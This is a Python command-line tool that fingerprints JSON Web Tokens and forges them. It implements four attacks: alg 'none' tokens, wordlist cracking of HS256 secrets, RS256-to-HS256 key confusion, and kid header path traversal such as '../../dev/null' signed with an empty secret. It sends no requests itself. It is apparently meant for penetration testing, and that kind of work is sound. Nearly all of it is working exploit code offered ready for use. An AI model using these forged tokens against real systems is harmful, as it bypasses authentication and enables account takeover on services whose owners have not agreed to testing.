#!/usr/bin/env python3
"""Fingerprint and test a JWT.

usage:
    python tools/jwt_tool.py "<token>"
    python tools/jwt_tool.py "<token>" --attack none
    python tools/jwt_tool.py "<token>" --attack crack --wordlist data/jwt-secrets.txt
    python tools/jwt_tool.py "<token>" --attack rs2hs --pubkey pub.pem
    python tools/jwt_tool.py "<token>" --attack kid --kid-value "../../dev/null"

Produces forged tokens for you to test manually. Never sends any request.
Standard library only.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path


def b64d(part: str) -> bytes:
    part += "=" * (-len(part) % 4)
    return base64.urlsafe_b64decode(part)


def b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def decode(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("token does not have 3 parts")
    header = json.loads(b64d(parts[0]))
    payload = json.loads(b64d(parts[1]))
    return header, payload, parts[2]


def sign_hs256(header: dict, payload: dict, secret: bytes) -> str:
    h = b64e(json.dumps(header, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64e(sig)}"


def fingerprint(header: dict, payload: dict) -> None:
    print(f"alg: {header.get('alg')!r}")
    for key in ("typ", "kid", "jku", "x5u"):
        if key in header:
            print(f"{key}: {header[key]!r}")
    print("claims:")
    for key, val in payload.items():
        print(f"  {key}: {val!r}")

    issues = []
    if header.get("alg", "").lower() == "none":
        issues.append("alg is 'none' — signature not enforced")
    if "exp" not in payload:
        issues.append("no 'exp' claim — token never expires")
    if header.get("jku") or header.get("x5u"):
        issues.append("token carries jku/x5u — test whether the server fetches it")
    if "kid" in header:
        issues.append("kid present — test path traversal / injection")
    if issues:
        print("findings:")
        for issue in issues:
            print(f"  - {issue}")


def attack_none(payload: dict) -> str:
    for alg in ("none", "None", "NONE"):
        header = {"alg": alg, "typ": "JWT"}
        h = b64e(json.dumps(header, separators=(",", ":")).encode())
        p = b64e(json.dumps(payload, separators=(",", ":")).encode())
        yield f"{h}.{p}."


def attack_crack(token: str, header: dict, payload: dict, wordlist: Path) -> None:
    if header.get("alg", "") != "HS256":
        print(f"note: alg is {header.get('alg')!r}; crack attempts HS256 only")
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected = b64d(parts[2])
    for word in wordlist.read_text(encoding="utf-8", errors="replace").splitlines():
        secret = word.strip().encode()
        if not secret:
            continue
        if hmac.compare_digest(hmac.new(secret, signing_input, hashlib.sha256).digest(), expected):
            print(f"CRACKED: secret = {word.strip()!r}")
            print("forged token (same claims):")
            print(sign_hs256(header, payload, secret))
            return
    print("not found in wordlist")


def attack_rs2hs(payload: dict, pubkey_path: Path) -> str:
    key = pubkey_path.read_bytes()
    header = {"alg": "HS256", "typ": "JWT"}
    return sign_hs256(header, payload, key)


def attack_kid(payload: dict, kid: str, secret: bytes = b"") -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    return sign_hs256(header, payload, secret)


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(description="JWT fingerprint and forgery helper")
    ap.add_argument("token", help="the JWT")
    ap.add_argument("--attack", choices=["none", "crack", "rs2hs", "kid"])
    ap.add_argument("--wordlist", default="data/jwt-secrets.txt")
    ap.add_argument("--pubkey", help="public key PEM for rs2hs")
    ap.add_argument("--kid-value", help="kid value for the kid attack")
    args = ap.parse_args(argv)

    try:
        header, payload, _ = decode(args.token)
    except Exception as exc:  # noqa: BLE001
        print(f"error: {exc}", file=sys.stderr)
        return 2

    if not args.attack:
        fingerprint(header, payload)
        return 0

    if args.attack == "none":
        print("alg:none tokens (test each against the target):")
        for forged in attack_none(payload):
            print(forged)
    elif args.attack == "crack":
        wl = Path(args.wordlist)
        if not wl.exists():
            print(f"error: wordlist not found: {wl}", file=sys.stderr)
            return 2
        attack_crack(args.token, header, payload, wl)
    elif args.attack == "rs2hs":
        if not args.pubkey or not Path(args.pubkey).exists():
            print("error: --pubkey PEM file required", file=sys.stderr)
            return 2
        print(attack_rs2hs(payload, Path(args.pubkey)))
    elif args.attack == "kid":
        if not args.kid_value:
            print("error: --kid-value required", file=sys.stderr)
            return 2
        print("forged token with injected kid (secret is the file content the server reads):")
        print(attack_kid(payload, args.kid_value))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
